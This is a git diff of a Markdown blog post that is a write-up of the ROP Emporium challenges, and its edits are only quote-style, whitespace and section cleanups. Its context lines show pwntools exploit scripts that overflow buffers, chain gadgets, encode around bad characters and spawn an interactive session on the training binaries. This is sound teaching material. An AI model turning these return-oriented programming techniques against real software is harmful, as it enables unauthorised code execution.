@@ -1,25 +1,20 @@
 ---
-title: "ROP Emporium Revisited"
-categories: ["Hacking", "Binary Exploitation"]
-tags: ["hacking", "pentesting", "pwntools", "Exploit Development"]
-date: "2021-07-27"
-type: "post"
+title: 'ROP Emporium Revisited'
+categories: ['Hacking', 'Binary Exploitation']
+tags: ['hacking', 'pentesting', 'pwntools', 'Exploit Development']
+date: '2021-07-27'
+type: 'post'
 weight: 400
-keywords: "hacking rop pwntools"
+keywords: 'hacking rop pwntools'
 ---
 
 ## Overview
 
-
-
 > ROP highlights a classical strategy across all facets of security exploitation, living off the land.
-
-
 
 ## ret2win #2
 
 `ret2win` is the first challenge among the rop emporium suite and plays out like a classical [buffer overflow](../basic-stack-based-overflows). The only real takeaway from this challenge is to note the state of the memory protections enabled for the binary.
-
 
 ```
     Arch:     i386-32-little
@@ -31,11 +26,11 @@ keywords: "hacking rop pwntools"
 
 We see that the `NX` bit is **enabled** this is true of almost all ROP challenges since we wish to prevent execution off the stack with shellcode. We note however that we can still control the return pointer and thus redirect code execution. Our goal is to call the `ret2win` function, but why can we even call this function?
 
-If you understand the notion off living off the land you will recognize the key utility of ROP and why it can be used to circumvent no execute (`NX`) memory protections. The instructions we execute *already exist within the program* after compilation.
+If you understand the notion off living off the land you will recognize the key utility of ROP and why it can be used to circumvent no execute (`NX`) memory protections. The instructions we execute _already exist within the program_ after compilation.
 
-In this case that code is the win function `ret2win` but there are many other instructions within the binary, some which are never even used by the program in its running lifetime ... 
+In this case that code is the win function `ret2win` but there are many other instructions within the binary, some which are never even used by the program in its running lifetime ...
 
-Compilers are not perfect programs, and indeed `x86` as an instruction set has its oddities, they leave behind garbage instructions as well as carrying out other weird behavior. 
+Compilers are not perfect programs, and indeed `x86` as an instruction set has its oddities, they leave behind garbage instructions as well as carrying out other weird behavior.
 
 > These leftover instructions, often called 'gadgets', can be of great use to us.
 
@@ -44,7 +39,6 @@ They are an example of a [weird machine](https://en.wikipedia.org/wiki/Weird_mac
 With this understanding, we proceed by fuzzing the offset to the return pointer with cyclic (yes even tho it tells us the bytes to overwrite). We can then hook `ret2win` from the symbols table and use `fit/flat` to pad the offset to our packed address.
 
 The exploit for the 32 bit binary (this is the track we will follow) is as follows.
-
 
 ```python
 from pwn import *
@@ -75,9 +69,7 @@ proc.sendlineafter('> ', payload)
 proc.interactive()
 ```
 
-
 ## write4
-
 
 ```python
 # ::::::::::: .data at this address is uninitialized ::::::::::
@@ -96,7 +88,7 @@ log.success(f".data starts @{hex(data_section)}")
 mov_gadget = elf.symbols['usefulGadgets']
 log.success(f"gadget: mov [edi], ebp; ret; @ {mov_gadget}")
 
-# this lookup fails if the list of registers to pop cannot 
+# this lookup fails if the list of registers to pop cannot
 # be met
 pop_gadget = rop.search(0, ['edi', 'ebp'], 'regs').address
 log.success(f"pop gadget: pop edi; pop ebp; ret; @ {hex(pop_gadget)}")
@@ -115,11 +107,11 @@ rop.raw([
 
     pop_gadget,             # pop edi; pop ebp; ret;
     data_section + 4,
-    '.txt',                 
+    '.txt',
     mov_gadget              # mov [edi], ebp; ret;
 ])
 # printfile arg in .data
-rop.print_file(data_section)                     
+rop.print_file(data_section)
 
 payload = fit({
     cyclic_find('laaa'): rop.chain()
@@ -128,11 +120,9 @@ payload = fit({
 # :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
 # shellit
-proc.sendlineafter('> ', payload)    
+proc.sendlineafter('> ', payload)
 proc.interactive()
 ```
-
-
 
 ## badchars
 
@@ -177,7 +167,7 @@ for char in encoded_target_str:
 rop.raw([
     pop_gadget,         # pop esi; pop edi; pop ebp;
     flag_str,           # 'flag' ^ xor_key
-    data_section,   
+    data_section,
     ret_gadget,         # ebp = ret
     mov_gadget,         # mov  DWORD PTR [edi], esi
 
@@ -201,7 +191,6 @@ proc.sendlineafter('> ', payload)
 proc.interactive()
 ```
 
-
 ## fluff
 
 ```python
@@ -219,22 +208,22 @@ DO WHILE m< OperandSize
 OD
 '''
 def bruteforce_mask_value(mask, target_value):
-    """ 
+    """
     create the stream of bytes that will produce
     the target value when suppied as an operand to
     the ptex instruction with the given mask
     """
     needed_bytes = []
-    
+
     # logic from @cryptocat
     for char in target_value:
         mask_reversed = bits(mask, endian='little')
         char_bits = bits(u8(char), endian='little')
-        
+
         set_bits_count = 0
         mask_offset = 0
         set_bits = ''
-        
+
         while set_bits_count < len(char_bits) - 1:
             if (char_bits[set_bits_count] == mask_reversed[mask_offset]):
                 set_bits += '1'
@@ -242,7 +231,7 @@ def bruteforce_mask_value(mask, target_value):
             else:
                 set_bits += '0'
             mask_offset += 1
-        
+
 
         set_bits += '0' * (16 - len(set_bits))
         needed_bytes.append(''.join(reversed(set_bits)))
@@ -280,7 +269,7 @@ def main():
         ])
 
     rop.print_file(data_section)
-    
+
     payload = flat({
         cyclic_find('laaa'): rop.chain()
     })
@@ -288,11 +277,4 @@ def main():
     proc.sendlineafter('> ', payload)
     # shellit
     proc.interactive()
-```
-
-
-## pivot
-
-```python
-
 ```
